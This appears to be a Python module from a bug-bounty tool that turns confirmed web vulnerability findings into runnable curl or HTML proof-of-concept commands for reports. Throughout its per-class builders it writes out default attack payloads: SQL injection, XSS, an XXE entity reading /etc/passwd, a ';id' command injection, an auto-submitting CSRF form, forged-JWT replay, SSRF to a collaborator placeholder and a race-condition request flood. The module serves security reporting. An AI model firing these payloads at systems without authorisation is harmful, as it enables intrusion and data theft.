"""Auto-PoC generator (Sprint 2.6 / roadmap Phase 1.4).

Turns a confirmed ``Vulnerability`` into a copy-pasteable, runnable proof-of-concept —
the "5-minute reproducibility" acceptance lever. A triager who can paste a command and
watch the bug reproduce accepts; one who has to reconstruct the request from prose often
marks it Informational.

Design rules:
  - Deterministic, never LLM-generated — the command is built from the finding's own
    captured evidence (endpoint, parameter, payload, method), so it cannot hallucinate.
  - Shell-safe — every command is assembled as an argv list and rendered with
    ``shlex.join``, so payloads with quotes/spaces stay correctly quoted and there is no
    injection surface for whoever pastes it.
  - Honest fallback — when the evidence lacks what a runnable command needs, we return a
    clearly-labelled MANUAL artifact with the narrative steps rather than fabricating a
    command that would not actually reproduce (fabricated PoCs get reports rejected).

The rendered ``## Proof of Concept`` block is embedded into the bounty report; the
``PoCArtifact.reproducible`` flag lets the triager gate / findings-quality treat an
auto-runnable PoC as stronger evidence than a manual note.
"""

from __future__ import annotations

import shlex
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

from ai_osop.core.models import Vulnerability


@dataclass
class PoCArtifact:
    """A generated proof-of-concept for one finding.

    ``kind`` is ``"curl"`` / ``"http"`` / ``"html"`` / ``"shell"`` when we produced a
    runnable artifact, or ``"manual"`` when we honestly could not and fell back to prose.
    ``reproducible`` is True only for runnable artifacts.
    """

    vuln_type: str
    kind: str
    commands: List[str] = field(default_factory=list)
    description: str = ""
    notes: List[str] = field(default_factory=list)
    reproducible: bool = False


def _vt(vuln: Vulnerability) -> str:
    vt = vuln.vuln_type
    return vt.value if hasattr(vt, "value") else str(vt)


def _first_evidence(vuln: Vulnerability) -> Dict[str, Any]:
    ev = vuln.evidence or []
    return ev[0] if ev and isinstance(ev[0], dict) else {}


def _endpoint(ev: Dict[str, Any]) -> str:
    return (
        ev.get("url")
        or ev.get("verify_url")
        or ev.get("store_url")
        or ev.get("render_url")
        or ev.get("host")
        or ""
    )


def _curl(
    method: str,
    url: str,
    *,
    param: Optional[str] = None,
    value: Optional[str] = None,
    headers: Optional[List[str]] = None,
    json_body: Optional[str] = None,
    content_type: Optional[str] = None,
) -> str:
    """Build one shell-safe curl command as a single quoted line.

    ``-i`` shows response headers/status (the evidence a triager compares against);
    ``-sS`` is quiet-but-shows-errors; ``-k`` tolerates the lab certs common on targets.
    When ``content_type`` is provided with ``json_body``, it overrides the default
    ``application/json`` Content-Type header (e.g. for XXE payloads).
    """
    method = (method or "GET").upper()
    args: List[str] = ["curl", "-sSk", "-i"]
    if json_body is not None:
        ct = content_type or "application/json"
        args += ["-X", method, "-H", f"Content-Type: {ct}", "--data", json_body]
        args.append(url)
    elif param is not None:
        if method == "GET":
            args += ["-G", url, "--data-urlencode", f"{param}={value or ''}"]
        else:
            args += ["-X", method, url, "--data-urlencode", f"{param}={value or ''}"]
    else:
        if method != "GET":
            args += ["-X", method]
        args.append(url)
    for h in headers or []:
        args += ["-H", h]
    return shlex.join(args)


# --------------------------------------------------------------------------- #
# Per-class builders — each returns a runnable PoCArtifact or None (no PoC).   #
# --------------------------------------------------------------------------- #


def _poc_sqli(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
    url = _endpoint(ev)
    param = ev.get("parameter") or ev.get("injection")
    if not url or not param:
        return None
    payloads = ev.get("payloads") or []
    payload = payloads[0] if payloads else "' OR '1'='1"
    method = ev.get("method") or "GET"
    cmd = _curl(method, url, param=param, value=payload)
    return PoCArtifact(
        vuln_type="sqli",
        kind="curl",
        commands=[cmd],
        description=f"Inject the SQLi payload into `{param}` at `{url}`.",
        notes=[f"Back-end DBMS observed: {ev.get('dbms', 'unknown')}."],
        reproducible=True,
    )


def _poc_xss(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
    param = ev.get("store_field") or ev.get("parameter")
    store_url = ev.get("store_url") or ev.get("url")
    render_url = ev.get("render_url")
    if not param or not store_url:
        return None
    payload = ev.get("payload") or "<script>alert(document.domain)</script>"
    method = ev.get("method") or ("POST" if ev.get("store_url") else "GET")
    cmds = [_curl(method, store_url, param=param, value=payload)]
    notes = []
    if render_url:
        cmds.append(_curl("GET", render_url))
        notes.append(f"Load `{render_url}` in a browser — the injected script executes.")
    return PoCArtifact(
        vuln_type="xss",
        kind="curl",
        commands=cmds,
        description=f"Store the XSS payload in `{param}` at `{store_url}`.",
        notes=notes,
        reproducible=True,
    )


def _poc_ssrf(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
    url = _endpoint(ev)
    param = ev.get("injection") or ev.get("parameter")
    if not url or not param:
        return None
    method = ev.get("method") or "GET"
    cmd = _curl(method, url, param=param, value="http://COLLABORATOR_URL/ssrf")
    it = ev.get("interaction", {}) if isinstance(ev.get("interaction"), dict) else {}
    return PoCArtifact(
        vuln_type="ssrf",
        kind="curl",
        commands=[cmd],
        description=f"Point `{param}` at an attacker-controlled URL and watch for the callback.",
        notes=[
            "Replace COLLABORATOR_URL with your OAST/Collaborator host.",
            f"Confirmed out-of-band callback: {it.get('method', 'GET')} {it.get('path', '/')}.",
        ],
        reproducible=True,
    )


def _poc_access_control(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
    url = _endpoint(ev)
    if not url:
        return None
    technique = ev.get("technique", "forgery")
    cmd = _curl("GET", url, headers=["Authorization: Bearer <FORGED_JWT>"])
    return PoCArtifact(
        vuln_type=_vt(vuln),
        kind="curl",
        commands=[cmd],
        description=f"Replay against `{url}` with a token produced via the `{technique}` technique.",
        notes=[
            f"Substitute <FORGED_JWT> with the token forged via `{technique}` "
            f"(e.g. alg:none or RS256→HS256 confusion).",
            f"Server accepts the forged identity: {ev.get('victim') or ev.get('sentinel', 'forged user')}.",
        ],
        reproducible=True,
    )


def _poc_mass_assignment(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
    url = _endpoint(ev)
    if not url:
        return None
    fields = ev.get("accepted_fields") or {"role": "admin"}
    if isinstance(fields, (list, tuple)):
        fields = {str(f): "admin" for f in fields}
    import json as _json

    body = _json.dumps(fields)
    method = ev.get("method") or "POST"
    cmd = _curl(method, url, json_body=body)
    return PoCArtifact(
        vuln_type="mass_assignment",
        kind="curl",
        commands=[cmd],
        description=f"Send the create/update request to `{url}` with the privileged field(s).",
        notes=["Confirm the privileged value is persisted/reflected in the response."],
        reproducible=True,
    )


def _poc_race_condition(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
    url = _endpoint(ev)
    if not url:
        return None
    n = int(ev.get("concurrency") or 20)
    method = ev.get("method") or "POST"
    single = _curl(method, url)
    loop = f"seq {n} | xargs -P {n} -I _ {single}"
    return PoCArtifact(
        vuln_type="race_condition",
        kind="shell",
        commands=[loop],
        description=f"Fire {n} concurrent requests at `{url}` to bypass a once-only limit.",
        notes=[
            f"Observed {ev.get('success_count', '>1')} successes against a limit of "
            f"{ev.get('expected_max', 1)} — for a true single-packet race prefer Turbo Intruder.",
        ],
        reproducible=True,
    )


def _poc_csrf(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
    url = _endpoint(ev)
    if not url:
        return None
    method = (ev.get("method") or "POST").upper()
    html = (
        f'<form action="{url}" method="{method}">\n'
        f'  <input type="hidden" name="example" value="attacker-controlled">\n'
        f'  <input type="submit" value="submit">\n'
        f"</form>\n"
        f"<script>document.forms[0].submit()</script>"
    )
    return PoCArtifact(
        vuln_type="csrf",
        kind="html",
        commands=[html],
        description=f"Host this page; an authenticated victim visiting it fires the request to `{url}`.",
        notes=["Add the real state-changing fields the endpoint expects."],
        reproducible=True,
    )


def _poc_dom_xss(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
    url = _endpoint(ev)
    if not url:
        return None
    param = ev.get("injection_point") or ev.get("parameter") or "q"
    payload = ev.get("payload") or "<img src=x onerror=alert(document.domain)>"
    cmd = _curl("GET", url, param=param, value=payload)
    return PoCArtifact(
        vuln_type="dom_xss",
        kind="curl",
        commands=[cmd],
        description=f"Visit `{url}` with `{param}` set to a JavaScript probe.",
        notes=[
            "The page contains client-side JavaScript that reads unsanitized data "
            "from the URL and writes it to a DOM sink. The probe executes in the browser.",
        ],
        reproducible=True,
    )


def _poc_ssti(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
    url = _endpoint(ev)
    param = ev.get("parameter") or ev.get("injection")
    if not url or not param:
        return None
    payload = ev.get("payload") or "{{7*7}}"
    method = ev.get("method") or "GET"
    cmd = _curl(method, url, param=param, value=payload)
    return PoCArtifact(
        vuln_type="ssti",
        kind="curl",
        commands=[cmd],
        description=f"Inject the template expression `{payload}` into `{param}` at `{url}`.",
        notes=["Observe the server evaluates the expression in its response."],
        reproducible=True,
    )


def _poc_xxe(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
    url = _endpoint(ev)
    if not url:
        return None
    body = (
        '<?xml version="1.0"?>'
        "<!DOCTYPE foo ["
        '  <!ENTITY xxe SYSTEM "file:///etc/passwd">'
        "]>"
        f"<root>&xxe;</root>"
    )
    method = ev.get("method") or "POST"
    cmd = _curl(method, url, json_body=body, content_type="application/xml")
    return PoCArtifact(
        vuln_type="xxe",
        kind="curl",
        commands=[cmd],
        description=f"Send an XXE payload to `{url}` with an external entity reading `/etc/passwd`.",
        notes=[
            "The entity content should appear in the response if the parser "
            "resolves external entities. Adjust the entity reference as needed.",
        ],
        reproducible=True,
    )


def _poc_command_injection(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
    url = _endpoint(ev)
    param = ev.get("parameter") or ev.get("injection")
    if not url or not param:
        return None
    payload = ev.get("payload") or ";id"
    method = ev.get("method") or "GET"
    cmd = _curl(method, url, param=param, value=payload)
    return PoCArtifact(
        vuln_type="command_injection",
        kind="curl",
        commands=[cmd],
        description=f"Inject the command `{payload}` into `{param}` at `{url}`.",
        notes=["Observe the command output in the response."],
        reproducible=True,
    )


def _poc_open_redirect(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
    url = _endpoint(ev)
    if not url:
        return None
    param = ev.get("parameter") or "redirect"
    payload = "https://attacker-controlled.com/"
    cmd = _curl("GET", url, param=param, value=payload)
    return PoCArtifact(
        vuln_type="open_redirect",
        kind="curl",
        commands=[cmd],
        description=f"Send a GET to `{url}` with `{param}` set to an external URL.",
        notes=[
            "Observe the server redirects to the attacker-controlled domain "
            "without validation — the response should be a 3xx to the external URL.",
        ],
        reproducible=True,
    )


def _poc_subdomain_takeover(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
    host = ev.get("host")
    if not host:
        return None
    cmd = shlex.join(["dig", "+short", "CNAME", host])
    return PoCArtifact(
        vuln_type="subdomain_takeover",
        kind="shell",
        commands=[cmd],
        description=f"Resolve `{host}` — it points at an unclaimed {ev.get('service', 'service')} resource.",
        notes=[
            f"Fingerprint: '{ev.get('signature', 'n/a')}'.",
            f"Claim the resource on {ev.get('service', 'the provider')} to serve content under the domain.",
        ],
        reproducible=True,
    )


_POC_BUILDERS: Dict[str, Callable[[Vulnerability, Dict[str, Any]], Optional[PoCArtifact]]] = {
    "sqli": _poc_sqli,
    "xss": _poc_xss,
    "stored_xss": _poc_xss,
    "reflected_xss": _poc_xss,
    "dom_xss": _poc_dom_xss,
    "ssrf": _poc_ssrf,
    "ssti": _poc_ssti,
    "xxe": _poc_xxe,
    "command_injection": _poc_command_injection,
    "open_redirect": _poc_open_redirect,
    "jwt_abuse": _poc_access_control,
    "broken_access_control": _poc_access_control,
    "idor": _poc_access_control,
    "bola": _poc_access_control,
    "mass_assignment": _poc_mass_assignment,
    "race_condition": _poc_race_condition,
    "csrf": _poc_csrf,
    "subdomain_takeover": _poc_subdomain_takeover,
}


def generate_poc(vuln: Vulnerability) -> PoCArtifact:
    """Build a runnable PoC for a confirmed finding, or an honest MANUAL fallback.

    Never raises — a PoC failure must not break report rendering. Returns a
    non-reproducible ``kind="manual"`` artifact when no runnable command can be built.
    """
    vt = _vt(vuln)
    ev = _first_evidence(vuln)
    builder = _POC_BUILDERS.get(vt)
    if builder is not None:
        try:
            artifact = builder(vuln, ev)
        except Exception:  # noqa: BLE001 - deterministic PoC must never break rendering
            artifact = None
        if artifact and artifact.commands:
            return artifact
    return PoCArtifact(
        vuln_type=vt,
        kind="manual",
        commands=[],
        description=(
            "No deterministic PoC could be built from the captured evidence for this "
            "finding class — reproduce manually from the Steps to Reproduce and Evidence."
        ),
        reproducible=False,
    )


def render_poc_markdown(vuln: Vulnerability) -> str:
    """Render the ``## Proof of Concept`` report section for a finding."""
    artifact = generate_poc(vuln)
    if artifact.kind == "manual":
        note = artifact.description
        return f"> {note}\n"

    lang = {"curl": "bash", "shell": "bash", "http": "http", "html": "html"}.get(
        artifact.kind, "bash"
    )
    lines = [artifact.description, ""]
    block = "\n".join(artifact.commands)
    lines.append(f"```{lang}\n{block}\n```")
    for n in artifact.notes:
        lines.append(f"- {n}")
    return "\n".join(lines) + "\n"
